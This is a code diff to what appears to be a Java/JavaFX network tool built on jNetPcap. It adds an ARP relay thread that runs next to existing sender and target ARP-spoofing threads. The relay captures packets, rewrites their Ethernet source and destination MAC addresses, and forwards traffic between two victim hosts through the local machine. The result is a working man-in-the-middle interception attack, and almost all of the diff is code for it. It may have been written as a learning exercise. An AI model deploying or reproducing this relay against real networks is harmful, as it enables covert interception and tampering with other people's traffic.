@@ -15,6 +15,7 @@ import org.jnetpcap.nio.JMemory;
 import org.jnetpcap.packet.JRegistry;
 import org.jnetpcap.packet.PcapPacket;
 import org.jnetpcap.protocol.lan.Ethernet;
+import org.jnetpcap.protocol.network.Ip4;
 
 import javafx.application.Platform;
 import javafx.collections.FXCollections;
@@ -190,6 +191,7 @@ public class Controller implements Initializable {
 		
 		new SenderARPSpoofing().start();
 		new TargetARPSpoofing().start();
+		new ARPRelay().start();
     }
     
     class SenderARPSpoofing extends Thread {
@@ -233,6 +235,60 @@ public class Controller implements Initializable {
     		}
     	}
     }
-}
+    
+    class ARPRelay extends Thread {
+    	@Override
+    	public void run() {
+    		Ip4 ip = new Ip4();
+    		PcapHeader header = new PcapHeader(JMemory.POINTER);
+    		JBuffer buf = new JBuffer(JMemory.POINTER);
+    		Platform.runLater(() -> {
+    			textArea.appendText("ARP Relay를 진행합니다.\n");
+    		});
+    		while (Main.pcap.nextEx(header, buf) != Pcap.NEXT_EX_NOT_OK) {
+    			PcapPacket packet = new PcapPacket(header, buf);
+    			int id = JRegistry.mapDLTToId(Main.pcap.datalink());
+    			packet.scan(id);
+    			byte[] data = packet.getByteArray(0, packet.size());
+    			byte[] tempDestinationMAC = new byte[6];
+    			byte[] tempSourceMAC = new byte[6];
+    			System.arraycopy(data, 0, tempDestinationMAC, 0, 6);
+    			System.arraycopy(data, 6, tempSourceMAC, 0, 6);
+    			if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
+    					Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.myMAC))) {
+    				if (packet.hasHeader(ip)) {
+        				if (Util.bytesToString(ip.source()).equals(Util.bytesToString(Main.myIP))) {
+        					System.arraycopy(Main.targetMAC, 0, data, 0, 6);
+        					ByteBuffer buffer = ByteBuffer.wrap(data);
+        					Main.pcap.sendPacket(buffer);
+        				}
+    				}
+    			}
+    			else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
+    					Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.senderMAC))) {
+    				if (packet.hasHeader(ip)) {
+    					System.arraycopy(Main.targetMAC, 0, data, 0, 6);
+    					System.arraycopy(Main.myMAC, 0, data, 6, 6);
+    					ByteBuffer buffer = ByteBuffer.wrap(data);
+    					Main.pcap.sendPacket(buffer);
+    				}
+    			}
+    			else if(Util.bytesToString(tempDestinationMAC).equals(Util.bytesToString(Main.myMAC)) &&
+    					Util.bytesToString(tempSourceMAC).equals(Util.bytesToString(Main.targetMAC))) {
+    				if (packet.hasHeader(ip)) {
+    					if (Util.bytesToString(ip.destination()).equals(Util.bytesToString(Main.senderIP))) {
+    						System.arraycopy(Main.senderMAC, 0, data, 0, 6);
+    						System.arraycopy(Main.myMAC, 0, data, 6, 6);
+    						ByteBuffer buffer = ByteBuffer.wrap(data);
+    						Main.pcap.sendPacket(buffer);
+    					}
+    				}
 
+    			}
+        		System.out.println(Util.bytesToString(buf.getByteArray(0, buf.size())));
+    		}
+    	}
+    }
+    
+}
 
